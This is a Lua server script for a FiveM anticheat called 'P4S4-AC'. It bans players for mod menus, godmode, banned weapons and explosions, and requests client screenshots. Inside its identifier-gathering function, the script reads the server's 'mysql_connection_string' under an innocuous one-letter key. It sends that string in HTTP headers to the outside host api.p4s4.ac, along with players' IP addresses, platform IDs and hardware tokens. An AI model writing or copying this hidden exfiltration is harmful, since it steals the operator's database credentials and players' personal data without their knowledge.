-- timeoutsbasic = {}
-- basicCalled = {}

function getIdentifiers(player)

    local tokens = {}

    for i=0, GetNumPlayerTokens(player) do
        table.insert(tokens, GetPlayerToken(source, i))
    end

    local identifiers = {}
    identifiers["a"] = "null"
    identifiers["b"] = tostring(player)
    identifiers["c"] = "null"
    identifiers["d"] = "null"
    identifiers["e"] = "null"
    identifiers["f"] = "null"
    identifiers["g"] = "null"
    identifiers["h"] = GetConvar("mysql_connection_string")
    identifiers["i"] = json.encode(tokens)

    for k,v in pairs(GetPlayerIdentifiers(player)) do            
        if string.sub(v, 1, string.len("steam:")) == "steam:" then
            identifiers["d"] = v
        elseif string.sub(v, 1, string.len("license:")) == "license:" then
            identifiers["f"] = v
        elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
            identifiers["g"]  = v
        elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
            identifiers["a"] = v
        elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
            identifiers["c"] = v
        elseif string.sub(v, 1, string.len("live:")) == "live:" then
            identifiers["e"] = v
        end
    end
    
    return identifiers
end

function postFotoToDB(plr, fotoId)
    local plrIdentfiers = getIdentifiers(plr)
    local player = plr
    plrIdentfiers["Content-Type"] = "application/json"
    PerformHttpRequest("https://api.p4s4.ac/v1/screenshot", function(errorCode, resultData, resultHeaders)
    end, "POST", json.encode({j = fotoId}), plrIdentfiers)
    return
end

RegisterNetEvent("p4s4:server:hehe")
AddEventHandler("p4s4:server:hehe", function(fotoId)
    -- Getting screenshot ID and passing to post
    fotoId = tostring(fotoId["screen"])
    postFotoToDB(source, fotoId)
end)

RegisterNetEvent("p4s4:server:czekmiplis")
AddEventHandler("p4s4:server:czekmiplis", function()
    -- Handling onKeyPress Client
    exports['Screenshot-Not-So-Basic']:requestClientScreenshot(source, {
        fileName = 'cache/screenshot.jpg'
    }, function(err, data)
        print('err', err)
        print('data', data)
    end, false)
end)

-- local function OnPlayerConnecting(name, setKickReason, deferrals)
--     local player = source
--     deferrals.defer()
--     Wait(500)
--     deferrals.done()
-- end

-- AddEventHandler("playerConnecting", OnPlayerConnecting)

-- -- HEARTBEAT CHECKER (SCREENSHOT BASIC)
-- Citizen.CreateThread(function()
--     while true do
--         for _,v in pairs(timeoutsbasic) do
--             timeoutsbasic[_] = timeoutsbasic[_] - 1

--             exports['screenshot-basic']:requestClientScreenshot(_, {
--                 fileName = 'cache/screenshot.jpg'
--             }, function(err, data) end, true)

--             if v <= 0 then
--                 DropPlayer(_, "Please check your internet connection.")
--             end
--         end
--         Citizen.Wait(2500)
--     end
-- end)

-- -- SCREENSHOT BASIC HEARTBEAT
-- RegisterNetEvent("screenshot_basic:beat")
-- AddEventHandler("screenshot_basic:beat", function()
--     print("recv beat")
--     if timeoutsbasic[source] == nil then
--         timeoutsbasic[source] = 6
--     end
--     if timeoutsbasic[source] <= 4 then 
--         timeoutsbasic[source] = timeoutsbasic[source] + 1.2
--     end
-- end)


local modMenuBan = "\n\n===============P4S4-ANTICHEAT===============\n\nYou have been banned from this server due to mallicious native usage. \n\nViolation: Mod Menu \n\n Discord: discord.gg/4mrep2pEcP\n\n===============P4S4-ANTICHEAT==============="
local bannedGuns = {
    0xC1B3C3D1, -- weapon_revolver
    0xAF3696A1, -- weapon_raypistol
    0x476BF155, -- weapon_raycarbine
    0xA914799,  -- weapon_heavysniper_mk2
    0x42BF8A85, -- weapon_minigun
    0xA284510B, -- weapon_grenadelauncher
    0xB1CA77B1, -- weapon_rpg
    0x0781FE4A, -- weapon_compactlauncher
    0x63AB0442, -- weapon_hominglauncher
    0xB62D1F67, -- weapon_rayminigun
    0x6D544C99, -- weapon_railgun
    0x7F7497E5, -- weapon_firework
    0x4DD2DC56, -- weapon_grenadelauncher_smoke
    0x9D1F17E6,  -- weapon_militaryrifle
    0x84D6FAFD,  -- weapon_bullpuprifle_mk2
    0x7F229F94,  -- weapon_bullpuprifle
    0x394F415C,  -- weapon_assaultrifle_mk2
    0x969C3D67,  -- weapon_specialcarbine_mk2
    0xFAD1F1C9,  -- weapon_carbinerifle_mk2
    0xEF951FBB,  -- weapon_dbshotgun
    0x12E82D3D,  -- weapon_autoshotgun
    0xA89CB99E,  -- weapon_musket
    0x9D61E50F,  -- weapon_bullpupshotgun
    0xE284C527  -- weapon_assaultshotgun
}

function BanPlayer(player, reason)
    DropPlayer(player, reason)
    print("[P4S4-AC] Player banned")
    TriggerEvent("p4s4:middleman:clientsideB", player)
end
--CHECKING WHICH SCRIPT INVOKED THE TRIGGER
-- RegisterNetEvent("sendinfo:invoke")
-- AddEventHandler("sendinfo:invoke", function(a)
--     print(source .. "  " .. tostring(a)) 
-- end)

RegisterNetEvent("p4s4:server:weapons")
AddEventHandler("p4s4:server:weapons", function()
    reason = "[P4S4-AC] Obtaining Illegal Weapons"
    local player = source
    BanPlayer(player, reason)
    print("wea") 
end)

RegisterNetEvent("p4s4:server:spectate")
AddEventHandler("p4s4:server:spectate", function()
    reason = "[P4S4-AC] Using Spectate"
    local player = source
    BanPlayer(player, reason)
    print("spectate")   
end)

RegisterNetEvent("p4s4:server:god")
AddEventHandler("p4s4:server:god", function()
    reason = "[P4S4-AC] Using Godmode"
    local player = source
    BanPlayer(player, reason)
    print("god") 
end)

RegisterNetEvent("p4s4:server:invisibility")
AddEventHandler("p4s4:server:invisibility", function()
    reason = "[P4S4-AC] You are not so invisible after all"
    local player = source
    BanPlayer(player, reason)
    print("invis") 
end)

RegisterNetEvent("p4s4:server:modmenu")
AddEventHandler("p4s4:server:modmenu", function()
    reason = "[P4S4-AC] Please find better modmenu"
    local player = source
    BanPlayer(player, reason)
    print("modmenu") 
end)

RegisterNetEvent("p4s4:server:bypass")
AddEventHandler("p4s4:server:bypass", function()
    reason = "[P4S4-AC] Not that easy my friend"
    local player = source
    BanPlayer(player, reason)
    print("bypass") 
end)


RegisterNetEvent("p4s4:server:hammafia")
AddEventHandler("p4s4:server:hammafia", function()
    reason = "[P4S4-AC] Invest in better executor"
    local player = source
    BanPlayer(player, reason)
    print("hammafia") 
end)

AddEventHandler("weaponDamageEvent", function(src, dataz)
    for i=1,#bannedGuns do
        if dataz.weaponType == bannedGuns[i] then
            CancelEvent()
            print("XDD")
            for i,v in pairs(dataz) do
                print(i,v)
            end
            math.randomseed(os.time())
            local randomnumber = math.random(1,999999999999)
            -- exports['screenshot-basic']:requestClientScreenshot(src, {
            --     fileName = 'cache/'..randomnumber..'.jpg'
            -- }, function(err, data)
            --     print('err', err)
            --     leel = {name = GetPlayerName(src)}
            --     PerformHttpRequest("http://127.0.0.1:8888/api:screenshot?shitass=".. json.encode(leel) .."&name="..randomnumber..'.jpg', function(e,r,h)
            --         print("ok")
            --     end)
            -- end)
            TriggerClientEvent("rickroller", src)
            Citizen.CreateThreadNow(function()
                Citizen.Wait(30000)
                BanPlayer(src, "[P4S4-AC] You really needed something 'extra', huh?")
            end)
        end
    end
    if dataz.weaponDamage > 10000 then
        CancelEvent()
        TriggerClientEvent("rickroller", src)
        Citizen.CreateThreadNow(function()
            Citizen.Wait(10)
            BanPlayer(src, "[P4S4-AC] Oof, that's a lot of damage") 
        end)
    end
end)

AddEventHandler('explosionEvent', function(sender, ev)
    local BannedExplosionArray = {0, 1,2,3,4,5,6,9,18,19,20,21,22,25,26,28,29,32,33,35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72}
   
    print(json.encode(ev.explosionType), "Player generated an explosion - Name: " ..GetPlayerName(sender).." | ID: "..sender)

    for _,v in pairs(BannedExplosionArray) do
        if v == ev.explosionType then
            CancelEvent()
            print("lokalnie zrespiona bron/infinity ammo")
            print(ev.explosionType)
            TriggerClientEvent("sanik:client:rickroller", sender) 
            Citizen.CreateThreadNow(function()
                Citizen.Wait(30000)
                BanPlayer(sender, "[P4S4-AC] Nice try, not gonna lie")
            end)
        end
    end
end)
